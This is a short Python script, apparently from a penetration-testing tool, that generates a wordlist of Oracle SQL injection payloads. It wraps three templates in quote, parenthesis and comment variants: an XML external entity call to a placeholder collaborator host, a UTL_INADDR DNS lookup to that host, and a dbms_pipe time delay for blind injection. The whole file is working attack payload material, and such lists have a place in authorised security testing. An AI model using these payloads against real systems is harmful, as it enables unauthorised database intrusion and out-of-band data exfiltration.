prefixes = [
    '',
    '" ',
    '") ',
    '")) ',
    '"))) ',
    ') ',
    ')) ',
    '))) '
]

sqlOperators = [
    '',
    'OR ',
    'UNION ',
    'AND '
]

suffixes = [
    '',
    '--',
    ' ("',
    ' (("',
    ' ((("',
    ' (',
    ' ((',
    ' ((('
]

templates = [
    'SELECT EXTRACTVALUE(xmltype("<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{collaborator}/"> %remote;]>"),"/l") FROM dual',
    'SELECT UTL_INADDR.get_host_address("{collaborator}")',
    'dbms_pipe.receive_message(("a"),{time})'
]


def generate():
    wordlist = []

    for prefix in prefixes:
        for sqlOperator in sqlOperators:
            for template in templates:
                for suffix in suffixes:
                    word = prefix + sqlOperator + template + suffix
                    wordlist.append(word)
                    wordlist.append(word.replace('"', '\''))
    
    return wordlist
